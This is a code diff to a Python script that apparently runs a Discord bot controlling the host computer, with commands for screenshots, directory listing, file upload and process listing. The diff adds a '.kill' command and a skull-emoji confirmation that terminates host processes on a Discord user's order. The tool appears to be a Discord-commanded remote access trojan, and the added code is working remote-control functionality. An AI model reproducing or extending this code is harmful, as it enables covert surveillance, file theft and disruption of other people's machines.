@@ -40,7 +40,6 @@ from resources.misc import *
 
 
 
-
 # ----------- Begin of config ---------- #
 # - Please check out README.md before  - #
 # -   you change following settings    - #
@@ -69,7 +68,7 @@ client = discord.Client(intents=discord.Intents.all())
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
-processes_messages = []
+processes_messages, processes_list, process_to_kill = [], [], ''
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
 working_directory = sys.argv[0].split('\\')[:-1]
 
@@ -133,7 +132,7 @@ async def on_raw_reaction_add(payload):
 
 @client.event
 async def on_reaction_add(reaction, user):
-    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages
+    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill
     if user.bot == False:
         try:
             match str(reaction):
@@ -192,7 +191,36 @@ async def on_reaction_add(reaction, user):
                         await reaction.message.channel.send('```Uploaded  ' + files_to_merge[2] + '  into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '```')
                         files_to_merge = [[], [], []]
                         expectation = None
-                    
+
+                case '💀':  
+                    if reaction.message.content[:39] == '```Do you really want to kill process: ':
+                        await reaction.message.delete()
+                        try:
+                            process_name = process_to_kill[0]
+                            if process_name[-1] == ']':
+                                process_name = process_name[::-1]
+                                for i in range(len(process_name)):
+                                    if process_name[i] == '[':
+                                        process_name = process_name[i+4:]
+                                        break
+                                process_name = process_name[::-1]
+                        except Exception as e:
+                            reaction_msg = await reaction.message.channel.send('```Error while parsing the process name...\n' + str(e) + '```')
+                            await reaction_msg.add_reaction('🔴')
+                        try:
+                            killed_processes = []
+                            for proc in process_iter():
+                                if proc.name() == process_name:
+                                    proc.kill()
+                                    killed_processes.append(proc.name())
+                            processes_killed = ''
+                            for i in killed_processes:
+                                processes_killed = processes_killed + '\n• ' + str(i)
+                            reaction_msg = await reaction.message.channel.send('```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```')
+                            await reaction_msg.add_reaction('🔴')
+                        except Exception as e:
+                            reaction_msg = await reaction.message.channel.send('```Error while killing processes...\n' + str(e) + '```')
+                            await reaction_msg.add_reaction('🔴')
         except: pass
 
 @client.event
@@ -206,7 +234,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill
     if message.author != client.user:
         if message.content == '.ss':
             await message.delete()
@@ -273,13 +301,13 @@ async def on_message(message):
             await message.delete()
             if message.channel.id == channel_ids['file']:
                 dir_content_f, dir_content_d, directory_content = [], [], []
-                for element in os.listdir('/'.join(working_directory)):
+                for element in os.listdir('/'.join(working_directory)+'/'):
                     if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
                     else: dir_content_d.append(element)
                 dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
                 for single_directory in dir_content_d: directory_content.append(single_directory)
                 for single_file in dir_content_f: directory_content.append(single_file)
-                await message.channel.send('```Content of ' + '/'.join(working_directory) +' at ' + current_time() + '```')
+                await message.channel.send('```Content of ' + '/'.join(working_directory) +'/ at ' + current_time() + '```')
                 lsoutput = directory_content
                 while lsoutput != []:
                     if len('\n'.join(lsoutput)) > 1994:
@@ -401,6 +429,26 @@ async def on_message(message):
                         processes = ''
                 reaction_msg = await message.channel.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type  .kill <process-number>```')
                 processes_messages.append(reaction_msg)
+                await reaction_msg.add_reaction('🔴')
+
+        elif message.content[:5] == '.kill':
+            await message.delete()
+            if len(processes_list) > 10:
+                try: asd = int(message.content[6:]) + 1
+                except:
+                    reaction_msg = await message.channel.send('```Please provide a valid number of process from  .show processes```')
+                    await reaction_msg.add_reaction('🔴')
+                    return
+                if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
+                    reaction_msg = await message.channel.send('```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
+                    process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
+                    await reaction_msg.add_reaction('💀')
+                    await reaction_msg.add_reaction('🔴')
+                else:
+                    reaction_msg = await message.channel.send("```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```')
+                    await reaction_msg.add_reaction('🔴')
+            else:
+                reaction_msg = await message.channel.send('```You need to generate the processes list to use this feature\n.show processes```')
                 await reaction_msg.add_reaction('🔴')
 
 
